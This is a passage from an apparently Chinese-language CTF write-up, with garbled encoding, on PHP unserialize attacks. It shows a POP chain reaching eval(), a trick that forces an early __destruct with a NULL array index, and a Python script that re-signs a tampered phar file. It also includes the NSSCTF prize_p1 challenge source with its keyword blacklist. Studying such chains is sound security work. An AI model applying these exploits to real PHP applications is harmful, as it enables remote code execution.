&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#75af00">flag&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#d88200">&amp;#34;hello __flag()&amp;#34;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">eval&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">err&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">$e1&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">errorr0&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">$e2&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">errorr1&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">$e3&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">errorr2&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">$e3&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">err&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;phpinfo();&amp;#34;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">$e2&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">err&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">$e3&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">$e1&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">num&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">$e2&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">$result&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">serialize&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$e1&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">unserialize&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$result&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// O:7:&amp;#34;errorr0&amp;#34;:1:{s:3:&amp;#34;num&amp;#34;;O:7:&amp;#34;errorr1&amp;#34;:1:{s:3:&amp;#34;err&amp;#34;;O:7:&amp;#34;errorr2&amp;#34;:1:{s:3:&amp;#34;err&amp;#34;;s:10:&amp;#34;phpinfo();&amp;#34;;}}}
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>å¦‚æœæˆ‘ä»¬å‘æœ€åä¸€è¡Œçš„unserializeä¹‹åå†æ·»åŠ &lt;code>throw new Exception&lt;/code>ï¼Œæˆ‘ä»¬ä¼šå‘ç°åŸæ¥çš„phpinfoç•Œé¢ç«‹åˆ»å°±ä¼šæ¶ˆå¤±ï¼Œé˜»æ­¢&lt;code>__destruct&lt;/code>çš„æ‰§è¡Œ&lt;/p>
&lt;p>é’ˆå¯¹è¿™ç§æƒ…å†µï¼Œæˆ‘ä»¬é€‰æ‹©å°†å¯¹è±¡æ’åœ¨æœ‰&lt;code>NULL&lt;/code>å…ƒç´ çš„æ•°ç»„ä¸­&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-php" data-lang="php">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">$e1&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">errorr0&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">$e2&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">errorr1&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">$e3&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">errorr2&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">$e3&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">err&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;phpinfo();&amp;#34;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">$e2&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">err&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">$e3&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">$e1&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">num&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">$e2&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">$c&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">array&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#f92672">=&amp;gt;&lt;/span>&lt;span style="color:#111">$e1&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#f92672">=&amp;gt;&lt;/span>&lt;span style="color:#00a8c8">NULL&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// a:2:{i:0;O:7:&amp;#34;errorr0&amp;#34;:1:{s:3:&amp;#34;num&amp;#34;;O:7:&amp;#34;errorr1&amp;#34;:1:{s:3:&amp;#34;err&amp;#34;;O:7:&amp;#34;errorr2&amp;#34;:1:{s:3:&amp;#34;err&amp;#34;;s:10:&amp;#34;phpinfo();&amp;#34;;}}}i:1;N;}
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// a:2:{i:0;O:7:&amp;#34;errorr0&amp;#34;:1:{s:3:&amp;#34;num&amp;#34;;O:7:&amp;#34;errorr1&amp;#34;:1:{s:3:&amp;#34;err&amp;#34;;O:7:&amp;#34;errorr2&amp;#34;:1:{s:3:&amp;#34;err&amp;#34;;s:10:&amp;#34;phpinfo();&amp;#34;;}}}i:0;N;}
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>è€Œç›´æ¥serialize($c)çš„ç»“æœä¹Ÿæ— æ³•è¾¾åˆ°é¢„æœŸï¼Œæ•°ç»„ä¸­i=0æ˜¯æˆ‘ä»¬çš„å¯¹è±¡ï¼Œi=1æ˜¯NULLï¼Œæˆ‘ä»¬æ‰‹åŠ¨æŠŠi:1æ”¹ä¸ºi:0ï¼Œä¹Ÿå°±æ˜¯æ”¹ä¸ºNULL è®©å…¶å¤±å»å¼•ç”¨ï¼Œæå‰GCè§¦å‘&lt;code>__destruct&lt;/code>&lt;/p>
&lt;h3 id="pharä¸­çš„åº”ç”¨">pharä¸­çš„åº”ç”¨&lt;/h3>
&lt;p>è€Œè¿™ç§æ”¹åŠ¨åœ¨pharä¸­ä¼šé€ æˆç­¾åé”™è¯¯ï¼ˆphpstormä¼šæ— æ³•å†è¯†åˆ«ï¼‰ï¼Œéœ€è¦é‡æ–°ç”Ÿæˆç­¾åï¼ˆä¸è¿‡ä¾æ—§æ— æ³•è¯†åˆ«ï¼‰&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">from&lt;/span> &lt;span style="color:#111">hashlib&lt;/span> &lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">sha1&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">file&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">open&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;arsenetang.phar&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#34;rb&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">read&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">text&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">file&lt;/span>&lt;span style="color:#111">[:&lt;/span>&lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">28&lt;/span>&lt;span style="color:#111">]&lt;/span> &lt;span style="color:#75715e"># è¯»å–å¼€å§‹åˆ°æœ«å°¾é™¤ç­¾åå¤–å†…å®¹&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">last&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">file&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">8&lt;/span>&lt;span style="color:#111">:]&lt;/span> &lt;span style="color:#75715e"># è¯»å–æœ€å8ä½çš„GBMBå’Œç­¾åflag&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">new_file&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">text&lt;/span>&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#111">sha1&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">text&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">digest&lt;/span>&lt;span style="color:#111">()&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">last&lt;/span> &lt;span style="color:#75715e"># ç”Ÿæˆæ–°çš„æ–‡ä»¶å†…å®¹ æ­¤æ—¶sha1æ­£ç¡®&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">open&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;change.phar&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#34;wb&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">write&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">new_file&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="nssctf-2021prize_p1">[NSSCTF 2021]prize_p1&lt;/h3>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-php" data-lang="php">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#75af00">php&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">highlight_file&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">__FILE__&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">getflag&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">__destruct&lt;/span>&lt;span style="color:#111">()&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// echo getenv(&amp;#34;FLAG&amp;#34;); // ç›®æ ‡
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#d88200">&amp;#34;flag{111}&amp;#34;&lt;/span>&lt;span style="color:#111">;&lt;/span> &lt;span style="color:#75715e">// æœ¬åœ°æµ‹è¯•
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">A&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#111">$config&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">__destruct&lt;/span>&lt;span style="color:#111">()&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">config&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#d88200">&amp;#39;w&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">$data&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">$_POST&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">];&lt;/span> &lt;span style="color:#75715e">// ä¼ å…¥pharå†…å®¹
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">preg_match&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;/get|flag|post|php|filter|base64|rot13|read|data/i&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">$data&lt;/span>&lt;span style="color:#111">))&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">die&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;æˆ‘çŸ¥é“ä½ æƒ³å¹²å—ï¼Œæˆ‘çš„å»ºè®®æ˜¯ä¸è¦é‚£æ ·åšã€‚&amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">file_put_contents&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;./tmp/a.txt&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">$data&lt;/span>&lt;span style="color:#111">);&lt;/span> &lt;span style="color:#75715e">// ä¼ å…¥pharå†…å®¹
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">}&lt;/span> &lt;span style="color:#00a8c8">else&lt;/span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">config&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#d88200">&amp;#39;r&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">$data&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">$_POST&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">];&lt;/span> &lt;span style="color:#75715e">// æ–‡ä»¶è·¯å¾„
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">preg_match&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;/get|flag|post|php|filter|base64|rot13|read|data/i&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">$data&lt;/span>&lt;span style="color:#111">))&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">die&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;æˆ‘çŸ¥é“ä½ æƒ³å¹²å—ï¼Œæˆ‘çš„å»ºè®®æ˜¯ä¸è¦é‚£æ ·åšã€‚&amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#75af00">file_get_contents&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$data&lt;/span>&lt;span style="color:#111">);&lt;/span> &lt;span style="color:#75715e">// pharè§¦å‘ååºåˆ—åŒ–
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">preg_match&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;/get|flag|post|php|filter|base64|rot13|read|data/i&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">$_GET&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">]))&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">die&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;æˆ‘çŸ¥é“ä½ æƒ³å¹²å—ï¼Œæˆ‘çš„å»ºè®®æ˜¯ä¸è¦é‚£æ ·åšã€‚&amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">unserialize&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$_GET&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">]);&lt;/span> &lt;span style="color:#75715e">// ä¼ å…¥Açš„åºåˆ—åŒ–
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#00a8c8">throw&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">Error&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;é‚£ä¹ˆå°±ä»è¿™é‡Œå¼€å§‹èµ·èˆªå§&amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span> &lt;span style="color:#75715e">// éœ€ç»• æ•°ç»„+i:0
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>å¯¹äºAï¼Œå†™å…¥&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-php" data-lang="php">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#75af00">php&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">A&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#111">$config&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#39;w&amp;#39;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">$a&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">A&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#75af00">serialize&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$a&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// O:1:&amp;#34;A&amp;#34;:{s:6:&amp;#34;config&amp;#34;;s:1:&amp;#34;w&amp;#34;;}
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>è¯»&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-php" data-lang="php">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#75af00">php&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">A&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#111">$config&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#39;r&amp;#39;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">$a&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">A&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#75af00">serialize&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$a&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// O:1:&amp;#34;A&amp;#34;:1:{s:6:&amp;#34;config&amp;#34;;s:1:&amp;#34;r&amp;#34;;}
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>å¯¹äºphar&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-php" data-lang="php">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#75af00">php&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">getflag&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">$a&lt;/span>&lt;span style="color:#111">[]&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">getflag&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">$a&lt;/span>&lt;span style="color:#111">[]&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">$phar&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">Phar&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;phar.phar&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">$phar&lt;/span> &lt;span style="color:#f92672">-&amp;gt;&lt;/span> &lt;span style="color:#75af00">startBuffering&lt;/span>&lt;span style="color:#111">();&lt;/span>
